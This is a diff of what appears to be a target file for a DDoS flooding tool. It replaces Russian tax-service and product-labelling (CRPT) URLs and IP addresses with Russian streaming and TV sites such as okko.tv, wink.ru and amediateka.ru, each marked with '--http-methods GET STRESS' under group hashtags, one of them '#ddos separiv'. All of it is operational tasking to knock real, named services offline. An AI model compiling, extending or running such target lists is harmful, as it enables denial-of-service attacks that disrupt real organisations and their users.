@@ -1,7 +1,7 @@
 #zhnec
 
-https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ https://spravka-nalog.ru https://viza.spravka-nalog.ru --http-methods STRESS
-tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 tcp://213.24.64.94:443 tcp://87.242.70.127:443 tcp://90.156.242.130:443
+https://wink.ru --http-methods GET STRESS
+tcp://212.193.155.253:80 tcp://212.193.155.253:443 tcp://37.220.163.158:80 tcp://37.220.163.158:443 tcp://212.193.153.139:443 tcp://87.226.155.212:80 tcp://87.226.155.212:443
 
 #gaidamaky
 https://www.gravitel.ru http://aloha.ru --http-methods GET
@@ -9,6 +9,8 @@ https://www.gravitel.ru http://aloha.ru --http-methods GET
 
 
 #ddos separiv
-https://www.crpt.ru https://markirovka.crpt.ru/login-kep https://milk.crpt.ru/ https://ismp.crpt.ru --http-methods GET STRESS
-https://suzgrid.crpt.ru/login http://suz2.crpt.ru http://api.mdlp.crpt.ru http://kb.crpt.ru --http-methods GET STRESS
-http://nrz.api.sb.mdlp.crpt.ru http://api.sb.mdlp.crpt.ru https://mail.crpt.ru https://честныйзнак.рф/potrebitelyam/ tcp://82.202.190.166:443 --http-methods GET STRESS
+https://okko.tv https://aeroflotbonus.okko.tv https://cabinet.okko.tv/login https://www.agent.okko.tv/ --http-methods GET STRESS 
+https://agents.okko.tv https://premiere.okko.tv/ https://show.okko.tv https://mimimi.okko.team/ --http-methods GET STRESS
+https://pobeda.okko.tv https://www.ontvtime.ru https://www.amediateka.ru https://kodiki.amediateka.ru/ --http-methods GET STRESS
+https://localandroid.amediateka.ru/ https://bbb.amediateka.ru/b https://rt.amediateka.ru/ https://akado.amediateka.ru/ --http-methods GET STRESS
+https://wink.ru https://www.kartina.tv https://www.debilizator.tv https://www.glaz.tv/online-tv/ --http-methods GET STRESS
